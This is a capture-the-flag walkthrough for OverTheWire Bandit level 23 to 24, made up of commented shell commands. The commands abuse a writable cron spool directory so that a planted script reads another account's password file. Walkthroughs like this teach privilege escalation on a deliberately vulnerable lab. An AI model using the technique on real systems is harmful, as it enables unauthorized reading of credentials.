Level 23 → Level 24
// username: bandit23
ssh bandit23@bandit.labs.overthewire.org -p 2220

// enter password for level 23

cat /etc/cron.d/cronjob_bandit24                       //shows cron job details for bandit24

cat /usr/bin/cronjob_bandit24.sh                        //reveals that scripts placed in a specific directory are executed

mkdir /tmp/myjob                                         //creates a temporary working directory

echo "cat /etc/bandit_pass/bandit24 > /tmp/myjob/pass" > /tmp/myjob/script.sh                              //creates a script to copy the password

chmod +x /tmp/myjob/script.sh                                                                          //makes the script executable

cp /tmp/myjob/script.sh /var/spool/bandit24/foo/                                                        //places the script where cron will execute it

sleep 60
cat /tmp/myjob/pass                                                                                  //waits for cron to run and reads the output file

exit

password of next level (bandit24) is displayed
